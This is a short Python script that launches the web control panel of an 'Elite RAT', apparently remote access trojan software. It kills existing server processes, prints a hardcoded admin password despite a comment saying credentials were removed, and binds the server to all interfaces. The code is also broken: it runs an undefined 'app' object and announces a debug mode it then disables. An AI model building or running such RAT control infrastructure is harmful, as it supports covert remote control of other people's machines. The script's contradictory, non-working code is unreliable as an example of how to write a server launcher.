#!/usr/bin/env python3
"""
Start the web server properly
"""

import os
import sys
import time
import socket

# Set environment variables
os.environ['STITCH_DEBUG'] = 'true'
# Legacy admin credentials removed - using webhook-based authentication

# Check if port is in use
def is_port_open(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1', port))
    sock.close()
    return result == 0

# Kill any existing servers
if is_port_open(5000):
    print("Port 5000 in use, killing existing server...")
    os.system("pkill -f web_app_real")
    time.sleep(1)

print("Starting Elite RAT Web Server...")
print("-" * 50)
print("URL: http://localhost:5000")
print("Username: admin")
print("Password: SuperSecurePass123!")
print("-" * 50)

# Import and run
sys.path.insert(0, '/workspace')

try:
    from main_entry import OranolioRATSystem
    
    # Use werkzeug server instead of socketio for testing
    print("\nStarting server in DEBUG mode...")
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
    
except Exception as e:
    print(f"\nError starting server: {e}")
    import traceback
    traceback.print_exc()